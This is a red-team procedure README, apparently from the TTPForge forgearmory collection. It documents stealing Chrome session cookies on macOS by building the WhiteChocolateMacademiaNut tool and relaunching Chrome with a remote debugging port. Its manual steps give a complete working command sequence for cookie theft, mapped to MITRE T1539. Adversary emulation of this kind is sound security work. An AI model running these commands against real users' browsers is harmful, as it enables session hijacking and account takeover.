# Extract Cookies with Chromium Browser via Remote Debugger Port

![Meta TTP](https://img.shields.io/badge/Meta_TTP-blue)

This TTP extracts cookies from Chromium-based browsers from a target system using the WhiteChocolateMacademiaNut tool. It currently works on macOS with Google Chrome, but can easily be extended to Microsoft Edge browser and to work on Linux (via apt) and Windows (via Chocolately).

## Pre-requisites

1. The executor can run as the current user on the target system.
2. The WhiteChocolateMacademiaNut tool must be accessible via a remote repository.
3. A Package manager is required such as Homebrew which will download and install the necessary tools such as Golang and Google Chrome.

## Examples

You can run the TTP using the following example:
```bash
ttpforge run forgearmory//credential-access/extract-cookies-from-chromium-browser/extract-cookies-from-chromium-browser.yaml
```

## Steps
1. **setup**: This step checks the current operating system. Currently, it checks if brew is installed. If brew is installed it will download and install Golang and Chrome.
2. **clone-whitecocolatemacademianut**: This step clones the WhiteChocolateMacademiaNut repository from GitHub. This will checkout commit b024f72f6350fb62853f06052a8431d20e76db7a. A cleanup step is also provided to remove the repository post-execution.
3. **build-whitecocolatemacademianut**: This step uses golang and build WhiteChocolateMacademiaNut allowing it to work on its respective operating system.
4. **run-whitecocolatemacademianut**: This step opens up Chrome and navigates to google.com and then the process is killed. Afterwards, Chrome is opened with remote debugger port on port 9222. WhiteChocolateMacademiaNut is then ran to steal the cookies. If the execution status is successful (0), the TTP exits with a success message. Otherwise, it exits with an error message.


## Manual Reproduction Steps

```
# Assuming Homebrew is present, install Golang and Google Chrome
brew install golang
brew install --cask google-chrome

# Clone and build WhiteChocolateMacademiaNut
git clone https://github.com/slyd0g/WhiteChocolateMacademiaNut
cd WhiteChocolateMacademiaNut
go mod init github.com/slyd0g/WhiteChocolateMacademiaNut
go get github.com/akamensky/argparse
go get golang.org/x/net/websocket
go build -o WhiteChocolateMacademiaNut

# Simulate browser activity
open -a "Google Chrome" "https://www.google.com" &
killall "Google Chrome"

# Open Chrome with remote debugger port
"/Applications/Google Chrome.app/Contents/MacOS/Google Chrome" --remote-debugging-port=9222 --restore-last-session --remote-allow-origins=http://localhost/ &

# Run WhiteChocolateMacademiaNut
./WhiteChocolateMacademiaNut --port 9222 --dump cookies --format raw
```

## MITRE ATT&CK Mapping

- **Tactics**:
  - TA0006 Credential Access
- **Techniques**:
  - T1539 Steal Web Session Cookie
